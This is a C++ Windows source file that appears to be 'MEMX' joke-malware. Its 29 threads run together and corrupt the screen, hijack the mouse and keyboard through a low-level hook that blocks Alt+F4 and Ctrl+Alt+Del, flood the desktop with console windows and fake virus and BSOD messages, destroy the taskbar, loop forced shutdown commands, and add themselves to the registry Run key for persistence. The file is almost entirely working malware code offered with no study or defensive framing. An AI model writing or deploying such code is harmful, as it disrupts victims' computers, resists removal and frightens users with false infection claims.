#include <windows.h>
#include <mmsystem.h>
#include <digitalv.h>
#include <random>
#include <vector>
#include <string>
#include <cstdio>
#include <ctime>

#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdi32.lib")

extern volatile bool g_running;

int SCREEN_W = 0;
int SCREEN_H = 0;

// ====== 1. INVERT SCREEN ======
DWORD WINAPI InvertScreenThread(LPVOID) {
    SCREEN_W = GetSystemMetrics(SM_CXSCREEN);
    SCREEN_H = GetSystemMetrics(SM_CYSCREEN);
    HDC hdc = GetDC(NULL);
    
    while (g_running) {
        for (int y = 0; y < SCREEN_H; y += 2) {
            for (int x = 0; x < SCREEN_W; x += 2) {
                COLORREF c = GetPixel(hdc, x, y);
                if (c != CLR_INVALID) {
                    SetPixel(hdc, x, y, RGB(
                        255 - GetRValue(c),
                        255 - GetGValue(c),
                        255 - GetBValue(c)
                    ));
                }
            }
        }
        Sleep(30);
    }
    ReleaseDC(NULL, hdc);
    return 0;
}

// ====== 2. FLYING CURSOR ======
DWORD WINAPI FlyingCursorThread(LPVOID) {
    SCREEN_W = GetSystemMetrics(SM_CXSCREEN);
    SCREEN_H = GetSystemMetrics(SM_CYSCREEN);
    srand((unsigned)time(NULL));
    
    while (g_running) {
        int x = rand() % SCREEN_W;
        int y = rand() % SCREEN_H;
        SetCursorPos(x, y);
        Sleep(5);
    }
    return 0;
}

// ====== 3. FLOOD WINDOWS ======
DWORD WINAPI FloodWindowsThread(LPVOID) {
    while (g_running) {
        system("start cmd /c color 0c & echo MEMX INSIDE! & timeout /t 2");
        Sleep(50);
    }
    return 0;
}

// ====== 4. SOUND CHAOS ======
DWORD WINAPI SoundChaosThread(LPVOID) {
    const char* sounds[] = {
        "SystemAsterisk", "SystemExclamation", "SystemHand",
        "SystemQuestion", "SystemDefault", "WindowsLogon",
        "WindowsLogoff", "WindowsCriticalStop"
    };
    srand((unsigned)time(NULL));
    
    while (g_running) {
        const char* sound = sounds[rand() % 8];
        PlaySoundA(sound, NULL, SND_ALIAS | SND_ASYNC);
        Sleep(500 + (rand() % 2000));
    }
    return 0;
}

// ====== 5. TUNNEL EFFECT ======
DWORD WINAPI TunnelThread(LPVOID) {
    SCREEN_W = GetSystemMetrics(SM_CXSCREEN);
    SCREEN_H = GetSystemMetrics(SM_CYSCREEN);
    HDC hdc = GetDC(NULL);
    HDC memDC = CreateCompatibleDC(hdc);
    HBITMAP hBitmap = CreateCompatibleBitmap(hdc, SCREEN_W, SCREEN_H);
    SelectObject(memDC, hBitmap);
    
    while (g_running) {
        BitBlt(memDC, 0, 0, SCREEN_W, SCREEN_H, hdc, 0, 0, SRCCOPY);
        
        for (int i = 0; i < 20; i++) {
            int size = SCREEN_W / (i + 1);
            int x = (SCREEN_W - size) / 2;
            int y = (SCREEN_H - size) / 2;
            
            HPEN pen = CreatePen(PS_SOLID, 2, RGB(
                (i * 12) % 255,
                (i * 7) % 255,
                (i * 3) % 255
            ));
            SelectObject(memDC, pen);
            HBRUSH brush = (HBRUSH)GetStockObject(NULL_BRUSH);
            SelectObject(memDC, brush);
            Rectangle(memDC, x, y, x + size, y + size);
            DeleteObject(pen);
        }
        
        BitBlt(hdc, 0, 0, SCREEN_W, SCREEN_H, memDC, 0, 0, SRCCOPY);
        Sleep(50);
    }
    
    DeleteObject(hBitmap);
    DeleteDC(memDC);
    ReleaseDC(NULL, hdc);
    return 0;
}

// ====== 6. TV NOISE ======
DWORD WINAPI TVNoiseThread(LPVOID) {
    SCREEN_W = GetSystemMetrics(SM_CXSCREEN);
    SCREEN_H = GetSystemMetrics(SM_CYSCREEN);
    HDC hdc = GetDC(NULL);
    srand((unsigned)time(NULL));
    
    while (g_running) {
        for (int y = 0; y < SCREEN_H; y += 4) {
            for (int x = 0; x < SCREEN_W; x += 4) {
                COLORREF c = RGB(rand() % 256, rand() % 256, rand() % 256);
                HBRUSH brush = CreateSolidBrush(c);
                RECT rect = {x, y, x + 4, y + 4};
                FillRect(hdc, &rect, brush);
                DeleteObject(brush);
            }
        }
        Sleep(50);
    }
    ReleaseDC(NULL, hdc);
    return 0;
}

// ====== 7. MIRROR SCREEN ======
DWORD WINAPI MirrorScreenThread(LPVOID) {
    SCREEN_W = GetSystemMetrics(SM_CXSCREEN);
    SCREEN_H = GetSystemMetrics(SM_CYSCREEN);
    HDC hdc = GetDC(NULL);
    HDC memDC = CreateCompatibleDC(hdc);
    HBITMAP hBitmap = CreateCompatibleBitmap(hdc, SCREEN_W, SCREEN_H);
    SelectObject(memDC, hBitmap);
    
    int mode = 0;
    while (g_running) {
        BitBlt(memDC, 0, 0, SCREEN_W, SCREEN_H, hdc, 0, 0, SRCCOPY);
        
        if (mode == 0) {
            StretchBlt(hdc, SCREEN_W, 0, -SCREEN_W, SCREEN_H, memDC, 0, 0, SCREEN_W, SCREEN_H, SRCCOPY);
        } else if (mode == 1) {
            StretchBlt(hdc, 0, SCREEN_H, SCREEN_W, -SCREEN_H, memDC, 0, 0, SCREEN_W, SCREEN_H, SRCCOPY);
        } else {
            StretchBlt(hdc, SCREEN_W, SCREEN_H, -SCREEN_W, -SCREEN_H, memDC, 0, 0, SCREEN_W, SCREEN_H, SRCCOPY);
        }
        mode = (mode + 1) % 3;
        Sleep(200);
    }
    
    DeleteObject(hBitmap);
    DeleteDC(memDC);
    ReleaseDC(NULL, hdc);
    return 0;
}

// ====== 8. KEYBOARD HOOK ======
HHOOK g_keyboardHook = NULL;

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
        
        if (p->vkCode == VK_F4 && (GetAsyncKeyState(VK_MENU) & 0x8000)) {
            return 1;
        }
        if (p->vkCode == VK_DELETE && (GetAsyncKeyState(VK_CONTROL) & 0x8000) &&
            (GetAsyncKeyState(VK_MENU) & 0x8000)) {
            return 1;
        }
        
        if (rand() % 3 == 0) {
            INPUT ip = {0};
            ip.type = INPUT_KEYBOARD;
            ip.ki.wVk = (WORD)(33 + (rand() % 93));
            ip.ki.dwFlags = 0;
            SendInput(1, &ip, sizeof(INPUT));
            ip.ki.dwFlags = KEYEVENTF_KEYUP;
            SendInput(1, &ip, sizeof(INPUT));
            return 1;
        }
    }
    return CallNextHookEx(g_keyboardHook, nCode, wParam, lParam);
}

DWORD WINAPI KeyStealerThread(LPVOID) {
    srand((unsigned)time(NULL));
    g_keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    while (g_running) Sleep(1000);
    UnhookWindowsHookEx(g_keyboardHook);
    return 0;
}

// ====== 9. BLOCK SHUTDOWN ======
DWORD WINAPI ShutdownBlockerThread(LPVOID) {
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) {
        return 1;
    }
    
    TOKEN_PRIVILEGES tp;
    LUID luid;
    LookupPrivilegeValueA(NULL, "SeShutdownPrivilege", &luid);
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    
    while (g_running) {
        AdjustTokenPrivileges(hToken, FALSE, &tp, 0, NULL, NULL);
        system("shutdown /a");
        Sleep(1000);
    }
    CloseHandle(hToken);
    return 0;
}

// ====== 10. FAKE BSOD ======
DWORD WINAPI FakeBSODThread(LPVOID) {
    Sleep(15000);
    
    HWND hwnd = GetDesktopWindow();
    ShowWindow(hwnd, SW_HIDE);
    
    HWND bsod = CreateWindowA(
        "STATIC", "SYSTEM CRASH",
        WS_POPUP | WS_VISIBLE,
        0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN),
        NULL, NULL, NULL, NULL
    );
    
    HDC hdc = GetDC(bsod);
    RECT rect;
    GetClientRect(bsod, &rect);
    
    HBRUSH brush = CreateSolidBrush(RGB(0, 0, 170));
    FillRect(hdc, &rect, brush);
    DeleteObject(brush);
    
    SetTextColor(hdc, RGB(255, 255, 255));
    SetBkMode(hdc, TRANSPARENT);
    
    const char* text = 
        "*** STOP: 0xDEADBEEF (MEMX_INFECTION)\n\n"
        "Your PC ran into a problem and needs to restart.\n"
        "Error: MEMX detected in kernel memory.\n\n"
        "Technical info:\n"
        "*** MEMX_DRIVER.sys - Address 0xDEADBEEF\n"
        "*** MEMX_ROOTKIT.sys - Address 0xCAFEBABE\n\n"
        "MEMX RULES!";
    
    DrawTextA(hdc, text, -1, &rect, DT_CENTER | DT_VCENTER);
    ReleaseDC(bsod, hdc);
    
    Sleep(5000);
    return 0;
}

// ====== 11. WHITE NOISE ======
DWORD WINAPI WhiteNoiseThread(LPVOID) {
    SCREEN_W = GetSystemMetrics(SM_CXSCREEN);
    SCREEN_H = GetSystemMetrics(SM_CYSCREEN);
    HDC hdc = GetDC(NULL);
    srand((unsigned)time(NULL));
    
    while (g_running) {
        for (int i = 0; i < 1000; i++) {
            int x = rand() % SCREEN_W;
            int y = rand() % SCREEN_H;
            SetPixel(hdc, x, y, RGB(rand() % 256, rand() % 256, rand() % 256));
        }
        Sleep(20);
    }
    ReleaseDC(NULL, hdc);
    return 0;
}

// ====== 12. DISTORTION ======
DWORD WINAPI DistortionThread(LPVOID) {
    SCREEN_W = GetSystemMetrics(SM_CXSCREEN);
    SCREEN_H = GetSystemMetrics(SM_CYSCREEN);
    HDC hdc = GetDC(NULL);
    int offset = 0;
    
    while (g_running) {
        for (int y = 0; y < SCREEN_H; y += 2) {
            for (int x = 0; x < SCREEN_W; x += 2) {
                int srcX = (x + offset) % SCREEN_W;
                int srcY = (y + offset) % SCREEN_H;
                COLORREF c = GetPixel(hdc, srcX, srcY);
                if (c != CLR_INVALID) {
                    SetPixel(hdc, x, y, RGB(
                        255 - GetRValue(c),
                        255 - GetGValue(c),
                        255 - GetBValue(c)
                    ));
                }
            }
        }
        offset = (offset + 1) % 10;
        Sleep(30);
    }
    ReleaseDC(NULL, hdc);
    return 0;
}

// ====== 13. CD-ROM OPEN/CLOSE ======
DWORD WINAPI CDRomSpamThread(LPVOID) {
    while (g_running) {
        mciSendStringA("set cdaudio door open", NULL, 0, NULL);
        Sleep(100);
        mciSendStringA("set cdaudio door closed", NULL, 0, NULL);
        Sleep(100);
    }
    return 0;
}

// ====== 14. VOLUME MAX ======
DWORD WINAPI VolumeMaxThread(LPVOID) {
    while (g_running) {
        keybd_event(VK_VOLUME_UP, 0, 0, 0);
        Sleep(50);
        keybd_event(VK_VOLUME_UP, 0, KEYEVENTF_KEYUP, 0);
        Sleep(100);
    }
    return 0;
}

// ====== 15. SCREEN FLASH ======
DWORD WINAPI ScreenFlashThread(LPVOID) {
    SCREEN_W = GetSystemMetrics(SM_CXSCREEN);
    SCREEN_H = GetSystemMetrics(SM_CYSCREEN);
    HDC hdc = GetDC(NULL);
    
    while (g_running) {
        HBRUSH brush = CreateSolidBrush(RGB(255, 255, 255));
        RECT rect = {0, 0, SCREEN_W, SCREEN_H};
        FillRect(hdc, &rect, brush);
        DeleteObject(brush);
        Sleep(50);
        
        brush = CreateSolidBrush(RGB(0, 0, 0));
        FillRect(hdc, &rect, brush);
        DeleteObject(brush);
        Sleep(50);
    }
    ReleaseDC(NULL, hdc);
    return 0;
}

// ====== 16. RANDOM WINDOW RESIZE ======
DWORD WINAPI ResizeWindowsThread(LPVOID) {
    while (g_running) {
        HWND hwnd = GetForegroundWindow();
        if (hwnd) {
            int w = rand() % 1000 + 100;
            int h = rand() % 800 + 100;
            SetWindowPos(hwnd, NULL, rand() % 1000, rand() % 600, w, h, SWP_NOZORDER);
        }
        Sleep(50);
    }
    return 0;
}

// ====== 17. TASKBAR HIDE ======
DWORD WINAPI TaskbarHiderThread(LPVOID) {
    HWND hTaskbar = FindWindowA("Shell_TrayWnd", NULL);
    while (g_running) {
        ShowWindow(hTaskbar, SW_HIDE);
        Sleep(1000);
    }
    return 0;
}

// ====== 18. MOUSE REVERSE ======
DWORD WINAPI MouseReverseThread(LPVOID) {
    SCREEN_W = GetSystemMetrics(SM_CXSCREEN);
    SCREEN_H = GetSystemMetrics(SM_CYSCREEN);
    
    while (g_running) {
        POINT pt;
        GetCursorPos(&pt);
        SetCursorPos(SCREEN_W - pt.x, SCREEN_H - pt.y);
        Sleep(10);
    }
    return 0;
}

// ====== 19. SCREEN ROTATE ======
DWORD WINAPI ScreenRotateThread(LPVOID) {
    SCREEN_W = GetSystemMetrics(SM_CXSCREEN);
    SCREEN_H = GetSystemMetrics(SM_CYSCREEN);
    HDC hdc = GetDC(NULL);
    HDC memDC = CreateCompatibleDC(hdc);
    HBITMAP hBitmap = CreateCompatibleBitmap(hdc, SCREEN_W, SCREEN_H);
    SelectObject(memDC, hBitmap);
    
    int angle = 0;
    while (g_running) {
        BitBlt(memDC, 0, 0, SCREEN_W, SCREEN_H, hdc, 0, 0, SRCCOPY);
        
        HBRUSH brush = CreateSolidBrush(RGB(rand() % 256, rand() % 256, rand() % 256));
        RECT rect = {
            SCREEN_W/4 + (int)(sin(angle * 3.14 / 180) * SCREEN_W/4),
            SCREEN_H/4 + (int)(cos(angle * 3.14 / 180) * SCREEN_H/4),
            SCREEN_W*3/4 + (int)(sin((angle + 180) * 3.14 / 180) * SCREEN_W/4),
            SCREEN_H*3/4 + (int)(cos((angle + 180) * 3.14 / 180) * SCREEN_H/4)
        };
        FillRect(hdc, &rect, brush);
        DeleteObject(brush);
        
        angle = (angle + 5) % 360;
        Sleep(30);
    }
    
    DeleteObject(hBitmap);
    DeleteDC(memDC);
    ReleaseDC(NULL, hdc);
    return 0;
}

// ====== 20. START PROGRAMS ======
DWORD WINAPI StartProgramsThread(LPVOID) {
    const char* programs[] = {
        "calc", "notepad", "mspaint", "wordpad", "explorer",
        "cmd", "regedit", "taskmgr", "control", "msinfo32"
    };
    srand((unsigned)time(NULL));
    
    while (g_running) {
        const char* prog = programs[rand() % 10];
        char cmd[256];
        sprintf_s(cmd, "start %s", prog);
        system(cmd);
        Sleep(100);
    }
    return 0;
}

// ====== 21. KEYBOARD LIGHTS ======
DWORD WINAPI KeyboardLightsThread(LPVOID) {
    while (g_running) {
        keybd_event(VK_CAPITAL, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0);
        keybd_event(VK_CAPITAL, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0);
        Sleep(100);
        keybd_event(VK_NUMLOCK, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0);
        keybd_event(VK_NUMLOCK, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0);
        Sleep(100);
        keybd_event(VK_SCROLL, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0);
        keybd_event(VK_SCROLL, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0);
        Sleep(100);
    }
    return 0;
}

// ====== 22. FAKE VIRUS WARNINGS ======
DWORD WINAPI FakeWarningsThread(LPVOID) {
    const char* messages[] = {
        "VIRUS DETECTED!",
        "SYSTEM CORRUPTED!",
        "MEMX INFECTION!",
        "HARDWARE FAILURE!",
        "KERNEL PANIC!",
        "DATA LOST!",
        "FILES DELETED!",
        "SYSTEM CRASH!"
    };
    srand((unsigned)time(NULL));
    
    while (g_running) {
        MessageBoxA(NULL, messages[rand() % 8], "MEMX WARNING", MB_ICONERROR | MB_OK);
        Sleep(500);
    }
    return 0;
}

// ====== 23. DESKTOP CLEANER ======
DWORD WINAPI DesktopCleanerThread(LPVOID) {
    HWND hDesktop = FindWindowA("Progman", NULL);
    if (!hDesktop) hDesktop = FindWindowA("DesktopClass", NULL);
    HWND hListView = NULL;
    if (hDesktop) {
        hListView = FindWindowExA(hDesktop, NULL, "SysListView32", NULL);
    }
    
    while (g_running && hListView) {
        ShowWindow(hListView, SW_HIDE);
        Sleep(1000);
        ShowWindow(hListView, SW_SHOW);
        Sleep(1000);
    }
    return 0;
}

// ====== 24. CLICK SPAM ======
DWORD WINAPI ClickSpamThread(LPVOID) {
    while (g_running) {
        mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
        Sleep(10);
        mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
        Sleep(100);
        mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0);
        Sleep(10);
        mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
        Sleep(100);
    }
    return 0;
}

// ====== 25. SCREEN SHAKE ======
DWORD WINAPI ScreenShakeThread(LPVOID) {
    SCREEN_W = GetSystemMetrics(SM_CXSCREEN);
    SCREEN_H = GetSystemMetrics(SM_CYSCREEN);
    HWND hwnd = GetDesktopWindow();
    
    while (g_running) {
        for (int i = 0; i < 10; i++) {
            SetWindowPos(hwnd, NULL, 
                rand() % 20 - 10, rand() % 20 - 10, 
                SCREEN_W, SCREEN_H, SWP_NOZORDER);
            Sleep(20);
        }
        Sleep(100);
    }
    return 0;
}

// ====== 26. POWER OFF ATTEMPT ======
DWORD WINAPI PowerOffThread(LPVOID) {
    while (g_running) {
        system("shutdown /s /t 0");
        system("shutdown /a");
        Sleep(1000);
    }
    return 0;
}

// ====== 27. STARTUP ADD ======
DWORD WINAPI StartupAddThread(LPVOID) {
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, 
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "MEMX", 0, REG_SZ, (BYTE*)path, strlen(path) + 1);
        RegCloseKey(hKey);
    }
    return 0;
}

// ====== 28. TASKBAR DESTROY ======
DWORD WINAPI TaskbarDestroyThread(LPVOID) {
    HWND hTaskbar = FindWindowA("Shell_TrayWnd", NULL);
    HWND hStart = FindWindowA("Button", NULL);
    
    while (g_running) {
        DestroyWindow(hTaskbar);
        DestroyWindow(hStart);
        Sleep(1000);
    }
    return 0;
}

// ====== 29. MOUSE TRAIL ======
DWORD WINAPI MouseTrailThread(LPVOID) {
    SCREEN_W = GetSystemMetrics(SM_CXSCREEN);
    SCREEN_H = GetSystemMetrics(SM_CYSCREEN);
    HDC hdc = GetDC(NULL);
    srand((unsigned)time(NULL));
    
    while (g_running) {
        POINT pt;
        GetCursorPos(&pt);
        for (int i = 0; i < 20; i++) {
            int x = pt.x + rand() % 100 - 50;
            int y = pt.y + rand() % 100 - 50;
            if (x >= 0 && x < SCREEN_W && y >= 0 && y < SCREEN_H) {
                SetPixel(hdc, x, y, RGB(rand() % 256, rand() % 256, rand() % 256));
            }
        }
        Sleep(10);
    }
    ReleaseDC(NULL, hdc);
    return 0;
}

// ====== START ALL EFFECTS ======
void StartEffects() {
    srand((unsigned)time(NULL));
    
    CreateThread(NULL, 0, InvertScreenThread, NULL, 0, NULL);
    CreateThread(NULL, 0, FlyingCursorThread, NULL, 0, NULL);
    CreateThread(NULL, 0, FloodWindowsThread, NULL, 0, NULL);
    CreateThread(NULL, 0, SoundChaosThread, NULL, 0, NULL);
    CreateThread(NULL, 0, TunnelThread, NULL, 0, NULL);
    CreateThread(NULL, 0, TVNoiseThread, NULL, 0, NULL);
    CreateThread(NULL, 0, MirrorScreenThread, NULL, 0, NULL);
    CreateThread(NULL, 0, KeyStealerThread, NULL, 0, NULL);
    CreateThread(NULL, 0, ShutdownBlockerThread, NULL, 0, NULL);
    CreateThread(NULL, 0, FakeBSODThread, NULL, 0, NULL);
    CreateThread(NULL, 0, WhiteNoiseThread, NULL, 0, NULL);
    CreateThread(NULL, 0, DistortionThread, NULL, 0, NULL);
    CreateThread(NULL, 0, CDRomSpamThread, NULL, 0, NULL);
    CreateThread(NULL, 0, VolumeMaxThread, NULL, 0, NULL);
    CreateThread(NULL, 0, ScreenFlashThread, NULL, 0, NULL);
    CreateThread(NULL, 0, ResizeWindowsThread, NULL, 0, NULL);
    CreateThread(NULL, 0, TaskbarHiderThread, NULL, 0, NULL);
    CreateThread(NULL, 0, MouseReverseThread, NULL, 0, NULL);
    CreateThread(NULL, 0, ScreenRotateThread, NULL, 0, NULL);
    CreateThread(NULL, 0, StartProgramsThread, NULL, 0, NULL);
    CreateThread(NULL, 0, KeyboardLightsThread, NULL, 0, NULL);
    CreateThread(NULL, 0, FakeWarningsThread, NULL, 0, NULL);
    CreateThread(NULL, 0, DesktopCleanerThread, NULL, 0, NULL);
    CreateThread(NULL, 0, ClickSpamThread, NULL, 0, NULL);
    CreateThread(NULL, 0, ScreenShakeThread, NULL, 0, NULL);
    CreateThread(NULL, 0, PowerOffThread, NULL, 0, NULL);
    CreateThread(NULL, 0, StartupAddThread, NULL, 0, NULL);
    CreateThread(NULL, 0, TaskbarDestroyThread, NULL, 0, NULL);
    CreateThread(NULL, 0, MouseTrailThread, NULL, 0, NULL);
}